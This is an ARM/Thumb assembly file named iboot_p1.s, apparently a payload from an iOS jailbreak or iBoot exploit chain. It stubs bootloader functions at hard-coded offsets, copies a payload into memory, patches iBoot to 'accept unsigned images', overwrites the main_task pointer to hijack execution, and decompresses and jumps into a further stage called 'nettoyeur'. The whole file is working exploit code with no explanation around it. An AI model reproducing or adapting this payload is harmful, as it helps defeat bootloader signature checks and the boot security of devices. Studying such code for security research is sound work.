@ iboot_p1.s
@
@ Copyright (c) 2021 - 2023 @ kok3shidoll
@
@


    .text
    .syntax    unified


    .arm
_entry:
    b    _entry


    .org    0x206A0
    .thumb
    .thumb_func
_get_current_task:
    bx    lr


    .org    0x21BD0
    .thumb_func
_arch_cpu_quiesce:
    bx    lr


    .org    0x24C38
    .thumb
    .thumb_func
_decompress_lzss:
    bx    lr


    .org    0x331BC
    .arm
_bcopy:
    bx    lr


    .org    0x33B60
    .thumb
    .thumb_func
_disable_interrupts:
    bx    lr


    .org    0x458F0
    .thumb
    .thumb_func
_iboot_patch:
    ldr    r0, =0x9FF45902          @ end point of _iboot_patch()
    ldr    r1, =0x84041300          @ payload
    movs   r2, #0x44                @ payload_sz
    blx    _bcopy

    ldr    r0, =0xc18               @ main_task() ptr
    ldr    r1, =(0x9ff41300 + 1)    @ payload_base
    str    r1, [r4, r0]

    b.n     _payload2


    .org    0x45BCC
    .global _payload
    .thumb
    .thumb_func
_payload:
    ldr    sp, =0x9FFF8000
    bl     _disable_interrupts
    ldr    r4, =0x84000000

    ldr    r0, =0x9ff00000          @ could be 0, but we use explicit offset for iloader
    mov    r1, r4
    ldr    r2, =0x42840
    blx    _bcopy

    b.n    _iboot_patch

_payload2:    
    @ accept unsigned images
    ldr    r0, =0x1ABA8
    ldr    r1, =0x60182000
    str    r1, [r4, r0]

    b.n    _next

.align    2

    .org    0x45BEC
    .long   0xe7ffdef0
    .long   0xe7ffdef0
_next:
    
    bl     _get_current_task
    movs   r1, #0
    str    r1, [r0, #0x44]

    ldr    r0, =0x9ff46000          @ dst
    movs   r1, #0xec                @ dst_sz
    ldr    r2, =0x9ff45acc          @ nettoyeur
    movs   r3, #0xdc                @ nettoyeur_sz

    mov    r5, r0
    bl     _decompress_lzss
    
    ldr    r0, =(0x9FF016C8 + 1)
    blx    r0
    bl     _arch_cpu_quiesce
    blx    r5
    bx     r4

.align    2